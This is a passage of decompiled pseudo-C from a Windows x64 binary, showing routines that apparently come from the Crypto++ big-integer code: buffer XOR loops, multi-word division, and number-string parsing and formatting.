      if ( v19 >= 8 && (v17 > v18 + 4 * (v19 - 1) || v17 + 4 * (v19 - 1) < v18) )
      {
        v21 = v17 + 16;
        v22 = v18 - v17;
        do
        {
          v23 = _mm_loadu_si128((const __m128i *)(v21 - 16));
          v24 = _mm_loadu_si128((const __m128i *)(v22 + v21 - 16));
          v20 += 8i64;
          v21 += 32i64;
          _mm_storeu_si128((__m128i *)(v21 - 48), _mm_xor_si128(v24, v23));
          _mm_storeu_si128(
            (__m128i *)(v21 - 32),
            _mm_xor_si128(
              _mm_loadu_si128((const __m128i *)(v22 + v21 - 32)),
              _mm_loadu_si128((const __m128i *)(v21 - 32))));
        }
        while ( v20 < (v16 >> 2) - ((v16 >> 2) & 7) );
      }
      if ( v20 < v19 )
      {
        v25 = v19 - v20;
        v26 = v17 + 4 * v20;
        v20 += v25;
        do
        {
          v27 = *(_DWORD *)(v18 - v17 + v26);
          v26 += 4i64;
          *(_DWORD *)(v26 - 4) ^= v27;
          --v25;
        }
        while ( v25 );
      }
    }
    v28 = 4 * v20;
    v29 = v16 - v28;
    if ( v29 )
    {
      v30 = v28 + v17;
      v31 = v28 + v18;
      if ( v29 )
      {
        if ( v29 >= 0x20 && (v30 > v29 + v31 - 1 || v29 + v30 - 1 < v31) )
        {
          v32 = (const __m128i *)v30;
          v33 = v31 - v30;
          do
          {
            v34 = _mm_loadu_si128(v32);
            v35 = _mm_loadu_si128((const __m128i *)((char *)v32 + v33));
            v3 += 32i64;
            v32 += 2;
            _mm_storeu_si128((__m128i *)&v32[-2], _mm_xor_si128(v35, v34));
            _mm_storeu_si128(
              (__m128i *)&v32[-1],
              _mm_xor_si128(_mm_loadu_si128((const __m128i *)((char *)v32 + v33 - 16)), _mm_loadu_si128(v32 - 1)));
          }
          while ( v3 < v29 - (v29 & 0x1F) );
        }
        if ( v3 < v29 )
        {
          v36 = v31 - v30;
          v37 = v3 + v30;
          v38 = v29 - v3;
          do
          {
            v39 = *(_BYTE *)(v36 + v37++);
            *(_BYTE *)(v37 - 1) ^= v39;
            --v38;
          }
          while ( v38 );
        }
      }
    }
  }
}

//----- (000000014003A8B0) ----------------------------------------------------
size_t *__fastcall sub_14003A8B0(size_t *a1, char a2, _QWORD *a3)
{
  _QWORD *v3; // rsi
  char v4; // bp
  size_t *v5; // rbx
  unsigned __int64 v6; // rdx
  _BYTE *v7; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  v6 = a3[2] + 1i64;
  if ( a1[3] != v6 && sub_1400049C0(a1, v6, 1) )
  {
    v5[2] = 0i64;
    if ( v5[3] < 0x10 )
      v7 = v5;
    else
      v7 = (_BYTE *)*v5;
    *v7 = 0;
  }
  sub_14000C8D0(v5, 1ui64, v4);
  sub_140004B80(v5, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v5;
}

//----- (000000014003AA40) ----------------------------------------------------
__int64 __fastcall sub_14003AA40(__int64 a1, __int64 a2, _DWORD *a3, char a4)
{
  char v4; // bp
  _DWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400AA028;
    *((_DWORD *)v8 + 8) = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400AA028: using guessed type __int64 (__fastcall *off_1400AA028)(void *);

//----- (000000014003AB00) ----------------------------------------------------
signed __int64 __fastcall sub_14003AB00(_QWORD *a1, int a2, char a3)
{
  _QWORD *v3; // rsi
  unsigned int v4; // ebx
  char *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rdi
  signed __int64 v8; // rax
  char *v9; // rdx
  __int64 v10; // r8
  signed __int64 v11; // rbx
  char v13; // [rsp+30h] [rbp-28h]
  char v14; // [rsp+38h] [rbp-20h]
  char v15; // [rsp+39h] [rbp-1Fh]
  char v16; // [rsp+3Ah] [rbp-1Eh]
  char v17; // [rsp+3Bh] [rbp-1Dh]
  char v18; // [rsp+3Ch] [rbp-1Ch]
  char v19[3]; // [rsp+3Dh] [rbp-1Bh]

  v3 = a1;
  if ( a3 == 1 )
  {
    v4 = 1;
    v18 = -(a2 != 0);
  }
  else
  {
    v14 = 0;
    v18 = a2;
    v4 = 4;
    v15 = HIBYTE(a2);
    v16 = BYTE2(a2);
    v17 = BYTE1(a2);
    v5 = &v15;
    do
    {
      if ( *v5 )
        break;
      --v4;
      ++v5;
    }
    while ( v4 > 1 );
    if ( v19[-v4] < 0 )
      ++v4;
  }
  v6 = *a1;
  v13 = a3;
  (*(void (__fastcall **)(_QWORD *, char *, signed __int64))(v6 + 40))(a1, &v13, 1i64);
  v7 = v4;
  v8 = sub_140060690(v3, v4);
  v9 = &v19[-v4];
  v10 = v4;
  v11 = v8;
  (*(void (__fastcall **)(_QWORD *, char *, __int64, _QWORD, char))(*v3 + 40i64))(v3, v9, v10, 0i64, 1);
  return v7 + v11 + 1;
}
// 14003AB00: using guessed type char var_1B[3];

//----- (000000014003AC00) ----------------------------------------------------
__int64 __fastcall sub_14003AC00(unsigned int *a1, unsigned int a2, unsigned int a3)
{
  unsigned int *v3; // r9
  unsigned int v4; // er11
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // rax
  unsigned int v7; // ecx
  unsigned __int64 v8; // rax

  v3 = a1;
  if ( a3 == -1 )
  {
    v4 = a1[2];
  }
  else if ( a3 )
  {
    v4 = *(_QWORD *)(a1 + 1) / (unsigned __int64)(a3 + 1);
  }
  else
  {
    v4 = *(_QWORD *)a1 / (unsigned __int64)a2;
  }
  v5 = *a1 - (unsigned __int64)(a2 * v4);
  *a1 = v5;
  v6 = a1[1]
     - (unsigned __int64)(unsigned int)-HIDWORD(v5)
     - (a2 * (unsigned __int64)v4 >> 32)
     - v4 * (unsigned __int64)a3;
  a1[2] += HIDWORD(v6);
  while ( 1 )
  {
    v7 = v3[2];
    v3[1] = v6;
    if ( !v7 && (unsigned int)v6 <= a3 && ((_DWORD)v6 != a3 || *v3 < a2) )
      break;
    v8 = *v3 - (unsigned __int64)a2;
    *v3 = v8;
    v6 = v3[1] - (unsigned __int64)(unsigned int)-HIDWORD(v8) - a3;
    v3[2] += HIDWORD(v6);
    ++v4;
  }
  return v4;
}

//----- (000000014003ACF0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14003ACF0(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbp
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rdi
  __int64 *v6; // rbx
  unsigned __int64 v7; // rsi
  __int64 v8; // rax
  unsigned __int64 v9; // r8
  bool v10; // cf
  bool v11; // zf
  unsigned __int64 v12; // r8
  unsigned __int128 v13; // ax
  unsigned __int64 v14; // rcx
  __int64 v15; // r10
  __int64 v16; // rdx
  unsigned __int64 v17; // rcx
  unsigned __int64 v18; // rdx
  __int64 v20; // [rsp+20h] [rbp-18h]
  __int64 v21; // [rsp+28h] [rbp-10h]

  v3 = a2;
  v4 = a3 + 1;
  v5 = a3;
  v6 = a1;
  if ( a3 == -1i64 )
  {
    v7 = a1[2];
  }
  else
  {
    if ( a3 )
    {
      v20 = a1[1];
      v8 = a1[2];
    }
    else
    {
      v4 = v3;
      v20 = *a1;
      v8 = a1[1];
    }
    v21 = v8;
    v7 = sub_14003D0F0(&v20, v4);
  }
  v9 = *v6 - v3 * v7;
  v10 = v9 < *v6;
  v11 = v9 == *v6;
  *v6 = v9;
  v12 = v6[1] - (v3 * (unsigned __int128)v7 >> 64);
  v13 = v5 * (unsigned __int128)v7;
  v14 = v12 - (!v10 && !v11) - v13;
  for ( v6[2] += -(signed __int64)(v12 > v6[1])
               - (v12 - (!v10 && !v11) > v12)
               - (v14 > v12 - (!v10 && !v11))
               - *((_QWORD *)&v13 + 1); ; v6[2] = v15 + -(signed __int64)(v18 > v6[1]) - (v14 > v18) )
  {
    v15 = v6[2];
    v6[1] = v14;
    if ( !v15 && v14 <= v5 && (v14 != v5 || *v6 < v3) )
      break;
    v16 = v6[1];
    v17 = *v6 - v3;
    v10 = v17 < *v6;
    v11 = v17 == *v6;
    *v6 = v17;
    v18 = v16 - v5;
    v14 = v18 - (!v10 && !v11);
    ++v7;
  }
  return v7;
}

//----- (000000014003AE30) ----------------------------------------------------
__int64 __fastcall sub_14003AE30(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rbp
  __int64 v6; // rsi
  __int64 v7; // rdi
  void *v8; // rdx
  void *v9; // rdx
  int v11; // [rsp+20h] [rbp-78h]
  __int64 (__fastcall **v12)(void *); // [rsp+28h] [rbp-70h]
  __int64 v13; // [rsp+38h] [rbp-60h]
  void *Memory; // [rsp+40h] [rbp-58h]
  int v15; // [rsp+48h] [rbp-50h]
  __int64 v16; // [rsp+50h] [rbp-48h]
  __int64 v17; // [rsp+58h] [rbp-40h]
  __int64 v18; // [rsp+60h] [rbp-38h]

  v18 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v16 = a2;
  v17 = a4;
  v11 = 0;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v12 = &off_1400A9910;
  v13 = 2i64;
  Memory = sub_14003A000(0x10ui64);
  v15 = 0;
  *((_QWORD *)Memory + 1) = 0i64;
  *(_QWORD *)Memory = 0i64;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, __int64, void *, __int64 (__fastcall ***)(void *), int, __int64 (__fastcall **)(void *)))(*(_QWORD *)v7 + 8i64))(
         v7,
         v5,
         &CryptoPP::cls_097 `RTTI Type Descriptor',
         &v12,
         v11,
         v12) )
  {
    sub_14003C000(v6, (__int64)&v12);
  }
  else
  {
    sub_14003C000(v6, v4);
  }
  v8 = Memory;
  memset(Memory, 0, 8 * v13);
  free(v8);
  v9 = *(void **)(v4 + 24);
  memset(*(void **)(v4 + 24), 0, 8i64 * *(_QWORD *)(v4 + 16));
  free(v9);
  return v6;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003AF30) ----------------------------------------------------
_QWORD *__fastcall sub_14003AF30(void *Dst, unsigned __int64 a2, unsigned int a3)
{
  unsigned __int64 v3; // rsi
  _QWORD *v4; // rdi
  char v5; // r14
  unsigned int v6; // er8
  unsigned __int64 v7; // r15
  unsigned __int64 v8; // rdx
  char v9; // al
  size_t *v10; // rbx
  unsigned __int64 v11; // rcx
  void *Dsta; // [rsp+30h] [rbp-50h]
  size_t v14; // [rsp+40h] [rbp-40h]
  unsigned __int64 v15; // [rsp+48h] [rbp-38h]
  void *v16; // [rsp+50h] [rbp-30h]
  unsigned __int64 v17; // [rsp+68h] [rbp-18h]

  v3 = a2;
  v4 = Dst;
  v5 = ~(a3 >> 26) & 0x20 | 0x41;
  v6 = a3 & 0x7FFFFFFF;
  if ( a2 )
  {
    v15 = 15i64;
    v14 = 0i64;
    LOBYTE(Dsta) = 0;
    if ( a2 )
    {
      v7 = v6;
      do
      {
        v8 = v3 % v7;
        v3 /= v7;
        if ( v8 >= 0xA )
          v9 = v5 - 10;
        else
          v9 = 48;
        v10 = sub_14003A8B0((size_t *)&v16, v9 + (unsigned __int8)v8, &Dsta);
        if ( &Dsta != (void **)v10 )
        {
          if ( v15 >= 0x10 )
            operator delete(Dsta);
          v15 = 15i64;
          v14 = 0i64;
          LOBYTE(Dsta) = 0;
          if ( v10[3] >= 0x10 )
          {
            Dsta = (void *)*v10;
            *v10 = 0i64;
          }
          else if ( v10[2] != -1i64 )
          {
            memmove(&Dsta, v10, v10[2] + 1);
          }
          v14 = v10[2];
          v15 = v10[3];
          v10[3] = 15i64;
          v10[2] = 0i64;
          *(_BYTE *)v10 = 0;
        }
        if ( v17 >= 0x10 )
          operator delete(v16);
      }
      while ( v3 );
    }
    v4[3] = 15i64;
    v4[2] = 0i64;
    *(_BYTE *)v4 = 0;
    v11 = v15;
    if ( v15 >= 0x10 )
    {
      *v4 = Dsta;
    }
    else if ( v14 != -1i64 )
    {
      memmove(v4, &Dsta, v14 + 1);
      v11 = v15;
    }
    v4[2] = v14;
    v4[3] = v11;
  }
  else
  {
    *((_QWORD *)Dst + 3) = 15i64;
    *((_QWORD *)Dst + 2) = 0i64;
    *(_BYTE *)Dst = 0;
    sub_140004F20(Dst, &unk_1400AA008, 1ui64);
  }
  return v4;
}

//----- (000000014003B100) ----------------------------------------------------
__int64 __fastcall sub_14003B100(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  unsigned __int8 v4; // bl
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  int v8; // ST20_4
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v12; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v13)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = 0;
  v9 = sub_140053D40((__int64)&v12);
  v10 = sub_14003A970(v9, v6, v5, v4, v8, -2i64);
  sub_140053CE0(v7, v10);
  if ( v13 )
    (**v13)(v13, 1i64);
  return v7;
}
// 14003A970: using guessed type __int64 __fastcall sub_14003A970(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014003B190) ----------------------------------------------------
__int64 __fastcall sub_14003B190(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  int v4; // eax

  v2 = a2;
  v3 = a1;
  if ( *(_DWORD *)(a2 + 32) == 1 )
  {
    if ( *(_DWORD *)(a1 + 32) == 1 )
      v4 = -(signed int)sub_14004A0B0(a2, a1);
    else
      v4 = -1;
  }
  else if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    v4 = 1;
  }
  else
  {
    v4 = sub_14004A0B0(a2, a1);
  }
  if ( v4 < 0 )
    v3 = v2;
  return v3;
}

//----- (000000014003B1F0) ----------------------------------------------------
__int64 __fastcall sub_14003B1F0(__int64 a1, __int64 (__fastcall **a2)(void *))
{
  __int64 (__fastcall **v2)(void *); // r12
  __int64 v3; // r13
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 (__fastcall *v6)(_QWORD, _QWORD, _QWORD); // rcx
  signed __int64 v7; // r15
  unsigned __int64 v8; // r14
  _QWORD *v9; // rsi
  _QWORD *v10; // rcx
  signed __int64 v11; // rax
  signed __int64 v12; // rdi
  _QWORD *v13; // rax
  signed __int64 v14; // rcx
  signed __int64 v15; // rcx
  signed __int64 v16; // rdx
  signed int v17; // er12
  __int64 (__fastcall **v18)(void *); // rax
  __int64 v19; // rdx
  int v20; // ebx
  int v21; // edi
  _QWORD *v22; // r13
  __int64 *v23; // rax
  __int64 *v24; // rdi
  unsigned __int64 v25; // rdx
  __int64 v26; // rax
  _QWORD *v27; // rax
  signed __int64 v28; // rax
  _QWORD *v29; // r8
  void *v30; // rdx
  __int64 v31; // rcx
  _QWORD *v32; // rsi
  signed int v33; // edi
  __int64 (__fastcall ***v34)(void *); // r8
  __int64 (__fastcall ***v35)(void *); // rdx
  signed __int64 v36; // rax
  signed __int64 v37; // rax
  _QWORD *v38; // rcx
  unsigned int v39; // er14
  unsigned int v40; // edx
  char v42; // [rsp+8h] [rbp-79h]
  __int64 v43; // [rsp+10h] [rbp-71h]
  _QWORD *v44; // [rsp+18h] [rbp-69h]
  int v45; // [rsp+20h] [rbp-61h]
  __int64 (__fastcall **v46)(void *); // [rsp+28h] [rbp-59h]
  __int64 (__fastcall **v47)(void *); // [rsp+30h] [rbp-51h]
  __int64 (__fastcall **v48)(void *); // [rsp+38h] [rbp-49h]
  __int64 v49; // [rsp+48h] [rbp-39h]
  _QWORD *v50; // [rsp+50h] [rbp-31h]
  int v51; // [rsp+58h] [rbp-29h]
  __int64 v52; // [rsp+60h] [rbp-21h]
  __int64 v53; // [rsp+68h] [rbp-19h]
  __int64 v54; // [rsp+70h] [rbp-11h]
  __int64 v55; // [rsp+78h] [rbp-9h]
  char v56; // [rsp+80h] [rbp-1h]
  __int64 v57; // [rsp+90h] [rbp+Fh]
  void *Memory; // [rsp+98h] [rbp+17h]

  v55 = -2i64;
  v2 = a2;
  v46 = a2;
  v3 = a1;
  v53 = a1;
  v54 = a1;
  v4 = 0i64;
  v45 = 0;
  LODWORD(v5) = 0;
  if ( *(_BYTE *)a2 )
  {
    do
      v5 = (unsigned int)(v5 + 1);
    while ( *((_BYTE *)a2 + v5) );
  }
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(sub_14003E2E0);
    qword_1400DAB40 = v6;
  }
  v46 = &off_1400A9910;
  v7 = 2i64;
  v8 = 16i64;
  v9 = sub_14003A000(0x10ui64);
  v44 = v9;
  v45 = 0;
  v10 = v9 + 1;
  v9[1] = 0i64;
  *v9 = 0i64;
  if ( !(_DWORD)v5 )
  {
    if ( !qword_1400DAB40 )
    {
      cfltcvt_init(v10);
      qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
    }
    *(_QWORD *)v3 = &off_1400A9910;
    v11 = 2i64;
    do
    {
      if ( *v10 )
        break;
      --v10;
      --v11;
    }
    while ( v11 );
    v12 = sub_14004B580((unsigned int)v11);
    *(_QWORD *)(v3 + 16) = v12;
    sub_140025670(v12);
    if ( v12 )
      v13 = sub_14003A000(8 * v12);
    else
      v13 = 0i64;
    *(_QWORD *)(v3 + 24) = v13;
    *(_DWORD *)(v3 + 32) = 0;
    if ( v13 != v9 )
      memcpy_s(v13, 8i64 * *(_QWORD *)(v3 + 16), v9, 8i64 * *(_QWORD *)(v3 + 16));
    v45 = 1;
    v14 = 2i64;
    goto LABEL_103;
  }
  v15 = (unsigned int)(v5 - 1);
  v16 = 1342177280i64;
  switch ( *((char *)v2 + v15) )
  {
    case 66:
    case 98:
      v17 = 2;
      break;
    case 72:
    case 104:
      v17 = 16;
      break;
    case 79:
    case 111:
      v17 = 8;
      break;
    default:
      v17 = 10;
      break;
  }
  v18 = v46;
  if ( (unsigned int)v5 > 2 && *(_BYTE *)v46 == 48 && *((_BYTE *)v46 + 1) == 120 )
    v17 = 16;
  if ( (_DWORD)v5 )
  {
    v47 = v46;
    v19 = (unsigned int)v5;
    v52 = (unsigned int)v5;
    while ( 1 )
    {
      v15 = *(unsigned __int8 *)v18;
      if ( (unsigned __int8)(v15 - 48) > 9u )
      {
        if ( (unsigned __int8)(v15 - 65) > 5u )
        {
          if ( (unsigned __int8)(v15 - 97) > 5u )
            v20 = v17;
          else
            v20 = (char)v15 - 87;
        }
        else
        {
          v20 = (char)v15 - 55;
        }
      }
      else
      {
        v20 = (char)v15 - 48;
      }
      if ( v20 >= v17 )
      {
        v4 = 0i64;
        goto LABEL_66;
      }
      v21 = v17;
      if ( !qword_1400DAB40 )
      {
        cfltcvt_init(v15);
        qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
      }
      v48 = &off_1400A9910;
      v49 = 2i64;
      v22 = sub_14003A000(0x10ui64);
      v50 = v22;
      if ( v17 < 0 )
      {
        v51 = 1;
        v21 = -v17;
      }
      else
      {
        v51 = 0;
      }
      *v22 = v21;
      v22[1] = 0i64;
      v23 = (__int64 *)sub_14004C040(&v46, &v56);
      v24 = v23;
      if ( &v46 != (__int64 (__fastcall ***)(void *))v23 )
      {
        v25 = v23[2];
        if ( v7 != v25 || !*(_QWORD *)(v23[3] + 8 * (v25 >> 1)) )
        {
          v26 = v23[3];
          if ( v25 )
          {
            v27 = (_QWORD *)(v26 + 8 * v25 - 8);
            do
            {
              if ( *v27 )
                break;
              --v27;
              --v25;
            }
            while ( v25 );
          }
          v28 = sub_14004B580((unsigned int)v25);
          sub_140049D90((__int64)&v42, v28);
          v9 = v44;
          v7 = v43;
        }
        v29 = (_QWORD *)v24[3];
        if ( v9 != v29 )
          memcpy_s(v9, 8 * v7, v29, 8 * v7);
        v45 = *((_DWORD *)v24 + 8);
      }
      v30 = Memory;
      memset(Memory, 0, 8 * v57);
      free(v30);
      memset(v22, 0, 0x10ui64);
      free(v22);
      if ( !qword_1400DAB40 )
      {
        cfltcvt_init(v31);
        qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
      }
      v48 = &off_1400A9910;
      v49 = 2i64;
      v32 = sub_14003A000(0x10ui64);
      v50 = v32;
      if ( v20 < 0 )
      {
        v33 = 1;
        v20 = -v20;
      }
      else
      {
        v33 = 0;
      }
      v51 = v33;
      *v32 = v20;
      v4 = 0i64;
      v32[1] = 0i64;
      sub_1400458E0((__int64)&v42, 2ui64);
      if ( v45 == 1 )
        break;
      v34 = &v48;
      v35 = &v46;
      if ( v33 == 1 )
        goto LABEL_62;
      sub_140049F00((__int64)&v46, (__int64)&v46, (__int64)&v48);
LABEL_64:
      memset(v32, 0, 0x10ui64);
      free(v32);
      v9 = v44;
      v7 = v43;
      v19 = v52;
LABEL_66:
      v18 = (__int64 (__fastcall **)(void *))((char *)v47 + 1);
      v47 = (__int64 (__fastcall **)(void *))((char *)v47 + 1);
      v52 = --v19;
      if ( !v19 )
      {
        v3 = v53;
        v16 = 1342177280i64;
        goto LABEL_68;
      }
    }
    if ( v33 == 1 )
    {
      sub_140049F00((__int64)&v46, (__int64)&v46, (__int64)&v48);
      v45 = 1;
      goto LABEL_64;
    }
    v34 = &v46;
    v35 = &v48;
LABEL_62:
    sub_14004A490((__int64)&v46, (__int64)v35, (__int64)v34);
    goto LABEL_64;
  }
LABEL_68:
  if ( *(_BYTE *)v46 == 45 )
  {
    if ( v45 == 1 || *v9 )
      goto LABEL_106;
    v36 = v7;
    if ( v7 )
    {
      v15 = (signed __int64)&v9[v7 - 1];
      do
      {
        if ( *(_QWORD *)v15 )
          break;
        v15 -= 8i64;
        --v36;
      }
      while ( v36 );
    }
    if ( (_DWORD)v36 )
LABEL_106:
      v45 = 1 - v45;
  }
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v15);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *(_QWORD *)v3 = &off_1400A9910;
  v37 = v7;
  if ( v7 )
  {
    v38 = &v9[v7 - 1];
    do
    {
      if ( *v38 )
        break;
      --v38;
      --v37;
    }
    while ( v37 );
  }
  if ( (unsigned int)v37 > 8ui64 )
  {
    if ( (unsigned int)v37 > 0x10ui64 )
    {
      if ( (unsigned int)v37 > 0x20ui64 )
      {
        if ( (unsigned int)v37 > 0x40ui64 )
        {
          if ( (unsigned int)v37 == 1i64 )
          {
            LOBYTE(v39) = 0;
          }
          else
          {
            v40 = 0;
            v39 = 64;
            do
            {
              if ( ((unsigned __int64)(unsigned int)v37 - 1) >> ((v39 + v40) >> 1) )
                v40 = (v39 + v40) >> 1;
              else
                v39 = (v39 + v40) >> 1;
            }
            while ( v39 - v40 > 1 );
          }
          v8 = 1i64 << v39;
        }
        else
        {
          v8 = 64i64;
        }
      }
      else
      {
        v8 = 32i64;
      }
    }
  }
  else
  {
    v8 = (unsigned int)dword_1400A8B28[(unsigned int)v37 - 1342177280 + v16];
  }
  *(_QWORD *)(v3 + 16) = v8;
  sub_140025670(v8);
  if ( v8 )
    v4 = sub_14003A000(8 * v8);
  *(_QWORD *)(v3 + 24) = v4;
  *(_DWORD *)(v3 + 32) = v45;
  if ( v4 != v9 )
    memcpy_s(v4, 8i64 * *(_QWORD *)(v3 + 16), v9, 8i64 * *(_QWORD *)(v3 + 16));
  v45 = 1;
  v14 = v7;
LABEL_103:
  memset(v9, 0, 8 * v14);
  free(v9);
  return v3;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 14004C040: using guessed type __int64 __fastcall sub_14004C040(_QWORD, _QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003B810) ----------------------------------------------------
__int64 __fastcall sub_14003B810(__int64 a1)
{
  __int64 v1; // rbx
  _DWORD *v2; // rcx
  signed __int64 v3; // rdx

  v1 = a1;
  sub_140036DA0(a1, 1);
  v2 = 0i64;
  *(_QWORD *)(v1 + 8) = 0i64;
  *(_BYTE *)(v1 + 81) = 0;
  *(_QWORD *)(v1 + 88) = 16i64;
  if ( *(_BYTE *)(v1 + 81) )
  {
    v3 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 81) = 1;
    v3 = v1 + 16;
  }
  *(_QWORD *)(v1 + 96) = v3;
  *(_BYTE *)(v1 + 169) = 0;
  *(_QWORD *)(v1 + 176) = 16i64;
  if ( !*(_BYTE *)(v1 + 169) )
  {
    *(_BYTE *)(v1 + 169) = 1;
    v2 = (_DWORD *)(v1 + 104);
  }
  *(_QWORD *)(v1 + 184) = v2;
  sub_140061C50(v2);
  return v1;
}

//----- (000000014003B890) ----------------------------------------------------
__int64 __fastcall sub_14003B890(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rax
  void *v5; // rsi
  void *v6; // rcx
  const void *v7; // r8
  __int64 v8; // rax
  const void *v9; // r8

  v2 = a2;
  v3 = a1;
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  *(_BYTE *)(a1 + 81) = 0;
  v4 = *(_QWORD *)(a2 + 88);
  *(_QWORD *)(a1 + 88) = v4;
  v5 = 0i64;
  if ( *(_QWORD *)(a2 + 88) > 0x10ui64 || *(_BYTE *)(a1 + 81) )
  {
    v6 = 0i64;
  }
  else
  {
    *(_BYTE *)(a1 + 81) = 1;
    v6 = (void *)(a1 + 16);
  }
  *(_QWORD *)(v3 + 96) = v6;
  v7 = *(const void **)(a2 + 96);
  if ( v7 )
    memcpy_s(v6, 4 * v4, v7, 4i64 * *(_QWORD *)(a2 + 88));
  *(_BYTE *)(v3 + 169) = 0;
  v8 = *(_QWORD *)(v2 + 176);
  *(_QWORD *)(v3 + 176) = v8;
  if ( *(_QWORD *)(v2 + 176) <= 0x10ui64 && !*(_BYTE *)(v3 + 169) )
  {
    *(_BYTE *)(v3 + 169) = 1;
    v5 = (void *)(v3 + 104);
  }
  *(_QWORD *)(v3 + 184) = v5;
  v9 = *(const void **)(v2 + 184);
  if ( v9 )
    memcpy_s(v5, 4 * v8, v9, 4i64 * *(_QWORD *)(v2 + 176));
  return v3;
}

//----- (000000014003B980) ----------------------------------------------------
void **__fastcall sub_14003B980(void **a1, const void **a2)
{
  const void **v2; // rdi
  void **v3; // rbx
  const void *v4; // rdx
  size_t v5; // rdi

  v2 = a2;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( sub_14004C280(a1, ((_BYTE *)a2[1] - (_BYTE *)*a2) >> 2) )
  {
    v4 = *v2;
    v5 = 4 * (((_BYTE *)v2[1] - (_BYTE *)*v2) >> 2);
    v3[1] = (char *)memmove(*v3, v4, v5) + v5;
  }
  return v3;
}

//----- (000000014003BA00) ----------------------------------------------------
__int64 __fastcall sub_14003BA00(__int64 a1, const void *a2, size_t a3)
{
  const void *v3; // r14
  size_t v4; // rbp
  __int64 v5; // rbx
  char *v6; // rsi

  v3 = a2;
  v4 = a3;
  v5 = a1;
  sub_140036DA0(a1, 1);
  v6 = 0i64;
  *(_QWORD *)v5 = &off_1400A9EA0;
  *(_DWORD *)(v5 + 8) = 0;
  *(_QWORD *)(v5 + 24) = v4 + 4;
  sub_1400255A0(v4 + 4);
  if ( v4 != -4i64 )
    v6 = (char *)sub_14003A000(v4 + 4);
  *(_QWORD *)(v5 + 32) = v6;
  memcpy(v6 + 4, v3, v4);
  return v5;
}
// 1400A9EA0: using guessed type __int64 (__fastcall *off_1400A9EA0)(void *);

//----- (000000014003BA90) ----------------------------------------------------
_QWORD *__fastcall sub_14003BA90(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  unsigned __int64 v3; // rcx
  signed __int64 v4; // rdi
  _QWORD *v5; // rax
  unsigned __int64 v6; // rdi
  void *v7; // rax
  char v9; // [rsp+38h] [rbp-80h]
  __int64 v10; // [rsp+48h] [rbp-70h]
  __int64 v11; // [rsp+50h] [rbp-68h]
  __int64 (__fastcall **v12)(void *); // [rsp+60h] [rbp-58h]
  int v13; // [rsp+78h] [rbp-40h]
